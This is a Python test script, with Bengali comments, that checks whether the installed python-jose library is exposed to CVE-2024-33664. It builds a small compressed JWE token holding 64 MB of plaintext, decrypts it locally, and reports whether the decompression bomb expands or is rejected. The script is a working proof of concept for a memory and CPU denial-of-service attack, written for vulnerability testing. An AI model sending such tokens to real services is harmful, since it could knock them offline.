"""
Phase B1 (JWE) — python-jose JWE decompression bomb, resource oracle
=====================================================================
CVE-2024-33664 (python-jose < 3.4.0): একটা ছোট JWE টোকেন (zip="DEF") ভেতরে বিশাল
compressible plaintext বহন করে; decrypt-এ সেটা unbounded প্রসারিত হয় → memory/CPU DoS।

এটা claim-mismatch নয় — verifier হয়তো সঠিক verdict দেয়, কিন্তু পথে সম্পদ শেষ করে।
তাই আমাদের **resource oracle**-এর জন্য উপযুক্ত: ছোট input → বিশাল output/সময়।

DY-সীমা: attacker শুধু recipient-এর PUBLIC key দিয়ে encrypt করে (public, তাই বৈধ)।
ground truth: বৈধ ছোট payload ~কিলোবাইট থাকার কথা; ৬৪ MB-তে প্রসারণ = শ্রেণী-A।
"""
import time, sys
from importlib.metadata import version
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

EXPANSION_THRESHOLD = 1_000_000   # ছোট টোকেন থেকে >1 MB প্রসারণ = সন্দেহজনক bomb


def main():
    try:
        from jose import jwe
    except Exception as e:
        print("python-jose/jwe নেই এই venv-এ:", e)
        return
    priv = rsa.generate_private_key(65537, 2048)
    pub = priv.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    prv = priv.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())

    payload = b"A" * (64 * 1024 * 1024)      # ৬৪ MB compressible
    token = jwe.encrypt(payload, pub, algorithm="RSA-OAEP", encryption="A256GCM", zip="DEF")
    v = version("python-jose")
    print("=" * 70)
    print(f"Phase B1 (JWE bomb) — target: python-jose {v}")
    print("=" * 70)
    print(f"  attack token: {len(token)} bytes (ছোট)")

    t0 = time.perf_counter()
    try:
        pt = jwe.decrypt(token, prv)
        dt = time.perf_counter() - t0
        bomb = len(pt) > EXPANSION_THRESHOLD
        klass = "A" if bomb else "OK"
        print(f"  [{klass}] decrypt: {len(token)}B → {len(pt)}B plaintext, {dt:.2f}s")
        print(f"      {'🚨 REAL true-positive: unbounded decompression (DoS)' if bomb else 'defended (প্রসারণ সীমিত)'}")
    except Exception as e:
        dt = time.perf_counter() - t0
        klass = "OK"
        print(f"  [OK] decrypt REJECT ({dt:.2f}s): {type(e).__name__}: {str(e)[:60]}")
        print("      defended — CVE-2024-33664 fix (decompression cap)")
    print(f"RESULT\tpython-jose {v}\tjwe_bomb_TP={1 if klass=='A' else 0}")


if __name__ == "__main__":
    main()
